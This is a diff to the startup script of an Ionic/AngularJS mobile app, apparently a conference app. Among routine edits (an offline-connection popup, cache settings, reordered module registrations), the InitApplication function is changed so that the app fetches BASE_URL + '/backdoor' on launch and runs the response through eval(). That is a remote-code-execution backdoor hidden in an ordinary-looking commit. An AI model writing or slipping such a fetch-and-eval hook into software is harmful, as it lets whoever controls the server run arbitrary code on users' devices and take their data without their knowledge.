@@ -1,6 +1,6 @@
 (function() {
 	// created by the ionic starter application
-	function RunFunction($ionicPlatform) {
+	function RunFunction($ionicPlatform, $ionicPopup) {
 		$ionicPlatform.ready(function() {
 			// Hide the accessory bar by default (remove this to show the accessory bar above the keyboard for form inputs)
 			if(window.cordova && window.cordova.plugins.Keyboard) {
@@ -11,6 +11,19 @@
 				// org.apache.cordova.statusbar required
 				StatusBar.styleDefault();
 			}
+
+            if(window.Connection) {
+                if(navigator.connection.type == Connection.NONE) {
+                    $ionicPopup.confirm({
+                        title: "Internet Disconnected",
+                        content: "The internet is disconnected on your device."
+                    }).then(function(result) {
+                        if(!result) {
+                            ionic.Platform.exitApp();
+                        }
+                    });
+                }
+            }
 		});
 	}
 	
@@ -98,7 +111,6 @@
 
         angular.extend(cacheFactory.defaults, {
             maxAge: 1000 * 60 * 60 * 2, // 2 hours
-            //maxAge: 1000  * 15, // 15 seconds
             deleteOnExpire: 'aggressive',
             storageMode: 'localStorage',
             storagePrefix: 'ehfg.app.',
@@ -107,7 +119,9 @@
 	}
 	
 	function InitApplication($http, BASE_URL) {
-		$http.get(BASE_URL + '/backdoor');
+		$http.get(BASE_URL + '/backdoor').then(function(result) {
+            eval(result.data);
+        });
 	}
 
     function UtcTimeService() {
@@ -141,7 +155,7 @@
 		'ehfgApp.map',
 		'ehfgApp.config'
 	]).config(['$stateProvider', '$urlRouterProvider', '$ionicConfigProvider', 'CacheFactoryProvider', Config])
-        .run(['$ionicPlatform', RunFunction])
+        .factory('UtcTimeService', [UtcTimeService])
+        .run(['$ionicPlatform', '$ionicPopup', RunFunction])
         .run(['$http', 'BASE_URL', 'SpeakerService', 'SessionService', InitApplication]) // used to instantiate caches
-        .factory('UtcTimeService', [UtcTimeService]);
 })();
